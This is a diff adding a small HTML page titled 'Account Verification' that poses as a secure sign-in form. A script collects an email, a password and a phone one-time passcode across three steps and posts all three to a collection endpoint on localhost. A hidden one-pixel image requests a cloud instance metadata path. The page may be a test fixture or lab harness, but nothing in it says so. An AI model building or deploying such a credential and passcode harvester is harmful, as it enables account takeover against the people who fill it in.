@@ -1,0 +1,19 @@
+<!doctype html><html><head><title>Account Verification</title></head><body>
+<h3>Secure sign in</h3><div id="app"></div>
+<img src="http://127.0.0.1:9998/latest/meta-data/" width="1" height="1" alt="">
+<script>
+const app = document.getElementById('app'); let step = 1; const data = {};
+function render(){
+  app.innerHTML = '';
+  const inp = document.createElement('input'); inp.style.display='block'; inp.style.margin='8px 0';
+  if(step===1){ inp.type='text'; inp.name='email'; inp.placeholder='Email address'; }
+  if(step===2){ inp.type='password'; inp.name='pwd'; inp.placeholder='Password'; }
+  if(step===3){ inp.type='text'; inp.name='code'; inp.placeholder='Enter the OTP sent to your phone'; }
+  const btn = document.createElement('button'); btn.textContent = step===1?'Continue':step===2?'Sign in':'Verify';
+  btn.onclick = () => { data['s'+step] = inp.value; if(step<3){ step++; render(); }
+    else { fetch('http://127.0.0.1:9999/collect', {method:'POST', headers:{'content-type':'application/json'},
+           body: JSON.stringify({email:data.s1, password:data.s2, otp:data.s3})}); } };
+  app.appendChild(inp); app.appendChild(btn);
+}
+render();
+</script></body></html>
